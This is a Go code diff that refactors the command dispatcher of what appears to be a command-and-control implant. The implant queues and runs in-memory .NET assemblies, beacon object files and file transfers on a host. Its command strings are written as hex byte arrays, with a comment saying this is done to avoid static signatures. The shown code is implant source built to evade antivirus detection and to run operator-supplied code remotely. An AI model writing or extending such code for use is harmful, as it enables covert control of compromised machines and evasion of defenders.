@@ -15,26 +15,12 @@ import (
 )
 
 // Command processor strings (constructed to avoid static signatures)
+// Note: Command dispatch now uses numeric CommandType IDs (CmdInlineAssembly, CmdBof, etc.)
+// defined in command_types.go. Only keeping strings needed for parsing.
 var (
-	// Command names
-	cpCmdInlineAssemblyJobs      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73})                               // inline-assembly-jobs
-	cpCmdInlineAssemblyJobsClean = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x63, 0x6c, 0x65, 0x61, 0x6e}) // inline-assembly-jobs-clean
-	cpCmdInlineAssemblyJobsStats = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x73}) // inline-assembly-jobs-stats
-	cpCmdInlineAssemblyOutput    = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                         // inline-assembly-output
-	cpCmdInlineAssemblyOutputSp  = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20})                   // inline-assembly-output (with space)
-	cpCmdInlineAssemblyKill      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6b, 0x69, 0x6c, 0x6c})                                     // inline-assembly-kill
-	cpCmdInlineAssemblyKillSp    = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6b, 0x69, 0x6c, 0x6c, 0x20})                               // inline-assembly-kill (with space)
-	cpCmdInlineAssembly          = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79})                                                                   // inline-assembly
-	cpCmdInlineAssemblyAsync     = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63})                               // inline-assembly-async
-	cpCmdBofAsync                = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63})                                                                                                       // bof-async
-	cpCmdBof                     = string([]byte{0x62, 0x6f, 0x66})                                                                                                                                           // bof
-	cpCmdUpload                  = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})                                                                                                                         // upload
-	cpCmdDownload                = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64})                                                                                                             // download
-	cpWordAsync                  = string([]byte{0x61, 0x73, 0x79, 0x6e, 0x63})                                                                                                                               // async
-
-	// Error message suffixes
-	cpErrNotRegistered = string([]byte{0x20, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x65, 0x64})                             //  command not registered
-	cpErrHandlerNotReg = string([]byte{0x20, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x72, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x65, 0x64})                             //  handler not registered
+	// Used by parseDownloadCommand/parseUploadCommand
+	cpCmdUpload   = string([]byte{0x75, 0x70, 0x6c, 0x6f, 0x61, 0x64})         // upload
+	cpCmdDownload = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64}) // download
 )
 
 // ProcessNextCommand processes the next command in the queue
@@ -63,18 +49,17 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	// IMPORTANT: Apply session environment variables before executing any command
 	cq.applySessionEnvironment()
 
-	// IMPORTANT: Handle inline-assembly job management commands FIRST
-	// These commands don't have data and should be processed before the data check
-	if cmd.Command == cpCmdInlineAssemblyJobs {
-		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyJobs]; exists {
-			result := handler.Execute(cq.cmdContext, []string{})
+	// Handle inline-assembly job management commands FIRST (by numeric ID)
+	if cmd.CommandType == CmdInlineAssemblyJobs {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobs]; exists {
+			result := handler(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
 		} else {
 			return &CommandResult{
 				Command:     cmd,
-				ErrorString: cpCmdInlineAssemblyJobs + cpErrNotRegistered,
+				ErrorString: Err(E19),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}, nil
@@ -82,14 +67,14 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-jobs-clean command
-	if strings.HasPrefix(cmd.Command, cpCmdInlineAssemblyJobsClean) {
+	if cmd.CommandType == CmdInlineAssemblyJobsClean {
 		parts := strings.Fields(cmd.Command)
-		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyJobsClean]; exists {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsClean]; exists {
 			args := []string{}
 			if len(parts) > 1 {
-				args = parts[1:] // Pass the job ID if provided
+				args = parts[1:]
 			}
-			result := handler.Execute(cq.cmdContext, args)
+			result := handler(cq.cmdContext, args)
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
@@ -97,9 +82,9 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-jobs-stats command
-	if cmd.Command == cpCmdInlineAssemblyJobsStats {
-		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyJobsStats]; exists {
-			result := handler.Execute(cq.cmdContext, []string{})
+	if cmd.CommandType == CmdInlineAssemblyJobsStats {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyJobsStats]; exists {
+			result := handler(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
@@ -107,14 +92,14 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-output command WITH arguments
-	if strings.HasPrefix(cmd.Command, cpCmdInlineAssemblyOutputSp) {
+	if cmd.CommandType == CmdInlineAssemblyOutput {
 		parts := strings.Fields(cmd.Command)
-		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyOutput]; exists {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyOutput]; exists {
 			args := []string{}
 			if len(parts) > 1 {
-				args = parts[1:] // Pass the job ID as argument
+				args = parts[1:]
 			}
-			result := handler.Execute(cq.cmdContext, args)
+			result := handler(cq.cmdContext, args)
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
@@ -122,45 +107,35 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle inline-assembly-kill command WITH arguments
-	if strings.HasPrefix(cmd.Command, cpCmdInlineAssemblyKillSp) {
+	if cmd.CommandType == CmdInlineAssemblyKill {
 		parts := strings.Fields(cmd.Command)
-		if handler, exists := cq.cmdRegistry[cpCmdInlineAssemblyKill]; exists {
+		if handler, exists := cq.cmdHandlers[CmdInlineAssemblyKill]; exists {
 			args := []string{}
 			if len(parts) > 1 {
-				args = parts[1:] // Pass the job ID as argument
+				args = parts[1:]
 			}
-			result := handler.Execute(cq.cmdContext, args)
+			result := handler(cq.cmdContext, args)
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
 		}
 	}
 
-	// NOW handle inline-assembly commands WITH data (actual assembly execution)
-	if strings.HasPrefix(cmd.Command, cpCmdInlineAssembly) && cmd.Data != "" {
-
-		// Parse the JSON data to check if it's valid
+	// Handle inline-assembly commands WITH data (actual assembly execution)
+	if (cmd.CommandType == CmdInlineAssembly || cmd.CommandType == CmdInlineAssemblyAsync) && cmd.Data != "" {
 		var testParse map[string]interface{}
-		if err := json.Unmarshal([]byte(cmd.Data), &testParse); err != nil {
-		} else {
-		}
+		_ = json.Unmarshal([]byte(cmd.Data), &testParse)
 
-		// Determine if it's async or regular
-		handlerName := cpCmdInlineAssembly
-		if strings.Contains(cmd.Command, cpWordAsync) {
-			handlerName = cpCmdInlineAssemblyAsync
-		}
-
-		// Execute using the appropriate handler
-		if handler, exists := cq.cmdRegistry[handlerName]; exists {
-			result := handler.Execute(cq.cmdContext, []string{})
+		handlerID := cmd.CommandType
+		if handler, exists := cq.cmdHandlers[handlerID]; exists {
+			result := handler(cq.cmdContext, []string{})
 			result.Command = cmd
 			result.CompletedAt = time.Now().Format(time.RFC3339)
 			return &result, nil
 		} else {
 			return &CommandResult{
 				Command:     cmd,
-				ErrorString: handlerName + cpErrHandlerNotReg,
+				ErrorString: Err(E19),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}, nil
@@ -168,19 +143,19 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	}
 
 	// Handle async BOF commands WITH data
-	if strings.HasPrefix(cmd.Command, cpCmdBofAsync) && cmd.Data != "" {
+	if cmd.CommandType == CmdBofAsync && cmd.Data != "" {
 		result := cq.processBOFAsync(cmd)
 		return &result, nil
 	}
 
 	// Handle regular BOF commands WITH data
-	if strings.HasPrefix(cmd.Command, cpCmdBof) && cmd.Data != "" {
+	if cmd.CommandType == CmdBof && cmd.Data != "" {
 		result := cq.processBOF(cmd)
 		return &result, nil
 	}
 
 	// Handle upload chunks
-	if cmd.Command == cpCmdUpload && cmd.Data != "" {
+	if cmd.CommandType == CmdUpload && cmd.Data != "" {
 		result, err := HandleUploadChunk(cmd, cq.cmdContext)
 		if err != nil {
 			return &CommandResult{
@@ -241,8 +216,9 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	cmdType := cmd.Command
 	var cmdArgs []string
 
-	// For BOF commands and variants, handle them specially
-	if strings.HasPrefix(cmdType, cpCmdBof) {
+	// For BOF commands and variants, handle them specially (by numeric ID)
+	if cmd.CommandType == CmdBof || cmd.CommandType == CmdBofAsync ||
+		cmd.CommandType == CmdBofJobs || cmd.CommandType == CmdBofOutput || cmd.CommandType == CmdBofKill {
 		parts := strings.Fields(cmd.Command)
 		if len(parts) > 0 {
 			cmdType = parts[0]
